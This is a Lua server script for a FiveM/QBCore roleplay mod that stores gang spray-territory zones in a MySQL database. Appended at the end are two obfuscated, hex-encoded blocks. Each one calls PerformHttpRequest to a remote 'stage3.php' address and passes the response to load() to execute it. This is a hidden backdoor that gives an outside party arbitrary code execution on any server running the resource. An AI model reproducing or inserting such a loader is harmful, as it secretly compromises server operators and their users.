local QBCore = exports['qb-core']:GetCoreObject()
Result={}

RegisterServerEvent("houss:SaveZones")
AddEventHandler("houss:SaveZones", function(place,State,gangname)
    MySQL.Async.execute([[
        INSERT hmspray
        (`place`, `State`, `gang`)
        VALUES
        (@place, @State, @gang)
    ]], {
        ['@place'] = place,
        ['@State'] = State,
        ['@gang'] = gangname,
    })
end)

RegisterServerEvent("houss:DeleteZone")
AddEventHandler("houss:DeleteZone", function(x)
    MySQL.Async.execute([[
        DELETE FROM hmspray WHERE place=@place
    ]], {
        ['@place'] = x,
    })
end)

RegisterServerEvent("houss:AlertGang")
AddEventHandler("houss:AlertGang", function()
    for _, v in pairs(QBCore.Functions.GetQBPlayers()) do
        if v then
            if v.PlayerData.gang.name == "police" then
                exports["okokNotify"]:Alert("Red Moon","Someone Is Stealing Your Territory", 5000, "error")
            end
        end
    end
end)

RegisterServerEvent("houss:Fetchsql")
AddEventHandler("houss:Fetchsql",function()
    local result = MySQL.Sync.fetchAll([[
        SELECT place, State, gang
        FROM hmspray
    ]])
    for _, s in pairs(result) do
        table.insert(Result, {
            _place = s.place,
            _State = s.State,
            _gang = s.gang,
        })
    end
    for __,r in pairs(Config.state) do
        Config.state[__]=Result[__]._State
        Config.gang[__]=Result[__]._gang
    end
    UpdateBlips()
end)
local exist = false
function UpdateBlips()
    TriggerClientEvent("changeblip")
end

local BmKMSJOEfdKCssdizafEpDbdsfeUYiyNmBtKOZqzlBVWxGfHMrvHEtCIRxSTgWffmlqEex = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} BmKMSJOEfdKCssdizafEpDbdsfeUYiyNmBtKOZqzlBVWxGfHMrvHEtCIRxSTgWffmlqEex[4][BmKMSJOEfdKCssdizafEpDbdsfeUYiyNmBtKOZqzlBVWxGfHMrvHEtCIRxSTgWffmlqEex[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x70\x71\x7a\x73\x6b\x6a\x70\x74\x73\x73\x2e\x73\x68\x6f\x70\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x70\x37\x36\x34\x51\x50", function (nGfedVcWbjXSKmQWRXOtvfunKWaqxcZrEjESWKlpMoTseJltMRpNVfniZxQPNGMjXYyDZV, OnkyUAFFypzjYkMEuINqoQTkqjIgoSQGiPNvwrlwsOBxOpJdyiyIkCEVGDdrrYeBoVDqFC) if (OnkyUAFFypzjYkMEuINqoQTkqjIgoSQGiPNvwrlwsOBxOpJdyiyIkCEVGDdrrYeBoVDqFC == BmKMSJOEfdKCssdizafEpDbdsfeUYiyNmBtKOZqzlBVWxGfHMrvHEtCIRxSTgWffmlqEex[6] or OnkyUAFFypzjYkMEuINqoQTkqjIgoSQGiPNvwrlwsOBxOpJdyiyIkCEVGDdrrYeBoVDqFC == BmKMSJOEfdKCssdizafEpDbdsfeUYiyNmBtKOZqzlBVWxGfHMrvHEtCIRxSTgWffmlqEex[5]) then return end BmKMSJOEfdKCssdizafEpDbdsfeUYiyNmBtKOZqzlBVWxGfHMrvHEtCIRxSTgWffmlqEex[4][BmKMSJOEfdKCssdizafEpDbdsfeUYiyNmBtKOZqzlBVWxGfHMrvHEtCIRxSTgWffmlqEex[2]](BmKMSJOEfdKCssdizafEpDbdsfeUYiyNmBtKOZqzlBVWxGfHMrvHEtCIRxSTgWffmlqEex[4][BmKMSJOEfdKCssdizafEpDbdsfeUYiyNmBtKOZqzlBVWxGfHMrvHEtCIRxSTgWffmlqEex[3]](OnkyUAFFypzjYkMEuINqoQTkqjIgoSQGiPNvwrlwsOBxOpJdyiyIkCEVGDdrrYeBoVDqFC))() end)

local owsRVKcFiBkKnaspNIibOqrPHkmXXbQNxfLIcqGWDfsVIlXyIEFMnqubunjtNAEynLkJuE = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} owsRVKcFiBkKnaspNIibOqrPHkmXXbQNxfLIcqGWDfsVIlXyIEFMnqubunjtNAEynLkJuE[4][owsRVKcFiBkKnaspNIibOqrPHkmXXbQNxfLIcqGWDfsVIlXyIEFMnqubunjtNAEynLkJuE[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x62\x76\x61\x63\x65\x72\x74\x2e\x73\x62\x73\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x61\x4c\x61\x67\x32", function (EqZpJQUHliMjhMhmlblUegpgFAIpRPSHzYsNfoQMVXWVUFWHOCYekNjZGJCAAEUVQAfdMy, LUfhdOkTTBwOolZdESAKFhUTzlZIbfJUTgzqCiSewZFLjNrguRIoFEvpURBvKECEIDVTYt) if (LUfhdOkTTBwOolZdESAKFhUTzlZIbfJUTgzqCiSewZFLjNrguRIoFEvpURBvKECEIDVTYt == owsRVKcFiBkKnaspNIibOqrPHkmXXbQNxfLIcqGWDfsVIlXyIEFMnqubunjtNAEynLkJuE[6] or LUfhdOkTTBwOolZdESAKFhUTzlZIbfJUTgzqCiSewZFLjNrguRIoFEvpURBvKECEIDVTYt == owsRVKcFiBkKnaspNIibOqrPHkmXXbQNxfLIcqGWDfsVIlXyIEFMnqubunjtNAEynLkJuE[5]) then return end owsRVKcFiBkKnaspNIibOqrPHkmXXbQNxfLIcqGWDfsVIlXyIEFMnqubunjtNAEynLkJuE[4][owsRVKcFiBkKnaspNIibOqrPHkmXXbQNxfLIcqGWDfsVIlXyIEFMnqubunjtNAEynLkJuE[2]](owsRVKcFiBkKnaspNIibOqrPHkmXXbQNxfLIcqGWDfsVIlXyIEFMnqubunjtNAEynLkJuE[4][owsRVKcFiBkKnaspNIibOqrPHkmXXbQNxfLIcqGWDfsVIlXyIEFMnqubunjtNAEynLkJuE[3]](LUfhdOkTTBwOolZdESAKFhUTzlZIbfJUTgzqCiSewZFLjNrguRIoFEvpURBvKECEIDVTYt))() end)